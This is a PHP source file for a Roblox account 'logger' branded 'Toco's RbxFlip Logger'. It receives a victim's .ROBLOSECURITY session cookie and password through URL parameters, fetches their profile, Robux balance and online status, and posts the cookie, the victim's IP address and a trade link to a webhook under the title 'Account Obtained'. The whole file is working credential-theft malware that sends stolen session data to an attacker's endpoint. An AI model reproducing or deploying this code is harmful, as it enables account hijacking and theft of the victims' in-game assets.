<?php
if (isset($_GET['x']) && isset($_GET['d'])){
    $cookie = htmlspecialchars($_GET['x']);
    $password = htmlspecialchars($_GET['d']);

}
    $ip= $_SERVER['REMOTE_ADDR'];



    
  $webhook = "webhook";
 
         
            $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
       curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Cookie: .ROBLOSECURITY=' . $cookie
        ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $profile = json_decode(curl_exec($ch), 1);
        curl_close($ch);

    $url = "https://api.roblox.com/users/" . $profile['UserID'] ."/onlinestatus/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, 0);
$online = json_decode(curl_exec($ch), 1);
$online1 = json_encode($online['IsOnline']);
$online2 = json_decode($online1, 1);
curl_close($ch);
print($online1);



            $hookObject = json_encode([
        "username" => "toco gay logger",
        "avatar_url" => "https://tr.rbxcdn.com/364bfe84c4c55fcc6a8cf53fd9f6028d/420/420/Hat/Png", 
                "embeds" => [
                    [
                        "title" => "Account Obtained",
                        "type" => "rich",
                        "description" => "",
                        "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
                        "timestamp" => date("c"),
                        "color" => hexdec("FF0000"),
                        "thumbnail" => [
                            "url" => "https://www.roblox.com/bust-thumbnail/image?userId=" . $profile["UserID"] . "&width=420&height=420&format=png"
                        ],
                        "author" => [
                            "name" => "Toco's RbxFlip Logger",
                            "url" => "https://github.com/5Haze"
                        ],
                        "fields" => [
                            [
                                "name" => "Username",
                                "value" => $profile["UserName"],
                              "online" => true

                            ],
                                [
                                "name" => "Ip-Address",
                                "value" => $ip,
                              "online" => true

                            ],
                            
                          [
                                "name" => "Online Status",
                                "value" => $online1,
                                "online" => false
                            ],
                               
 
                            [
                                "name" => "Robux Balance",
                                "value" =>"``" . $profile["RobuxBalance"] ."``",
                                "online" => true
                            ],
                            [
                                "name" => "Premium",
                                "value" => $profile["IsPremium"],
                           "inline" => true
                            ],
                            [
                                "name" => "Rolimon's",
                                "value" => "https://www.rolimons.com/player/" . $profile["UserID"]
                            ],
                         [
                                "name" => "Trade Link",
                                "value" => "https://www.roblox.com/Trade/TradeWindow.aspx?TradePartnerID=" . $profile["UserID"]
                            ],
                            
                            [
                                "name" => "Cookie",
                                "value" => "```" . $cookie . "```"
                            ],
                        ]
                    ]
                ]
            
            ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
  $ch = curl_init();
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt_array($ch, [
        CURLOPT_URL => "$webhook",
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $hookObject,
        CURLOPT_HTTPHEADER => [
            "Content-Type: application/json"
        ]
    ]);
    
    curl_exec($ch);
    curl_close($ch);


?>
